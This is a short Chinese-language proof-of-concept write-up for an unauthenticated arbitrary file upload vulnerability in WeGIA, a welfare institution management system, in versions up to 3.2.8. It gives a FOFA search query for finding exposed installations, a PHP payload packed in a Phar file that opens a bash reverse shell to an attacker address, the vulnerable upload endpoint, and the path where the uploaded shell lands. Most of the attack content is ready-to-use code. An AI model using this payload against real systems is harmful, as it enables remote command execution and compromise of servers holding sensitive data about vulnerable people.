# WeGIA存在前台任意文件上传漏洞

**WeGIA是一个福利机构管理器，并且具有一下几种功能，并且在3.2.8及之前版本都存在前台任意文件上传漏洞，且都可进行直接上传Phar等文件执行任意命令，反弹Shell等操作。**

## fofa

```javascript
"./assets/vendor/select2/select2.js"
```

## poc

phar内容

```php
<?php
$ip = 'IP';
$port = 4444;
system("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
?>

```

将phar文件上传

```javascript
/WeGIA/html/socio/sistema/controller/controla_xlsx.php
```

![image-20250127154942138](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501271549223.png)

上传后，文件在 /WeGIA/html/socio/sistema/tabelas/shell.phar

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501271550801.png)

## 漏洞来源

- https://mp.weixin.qq.com/s/GhaxwVBzJKHf0AucOU6hbw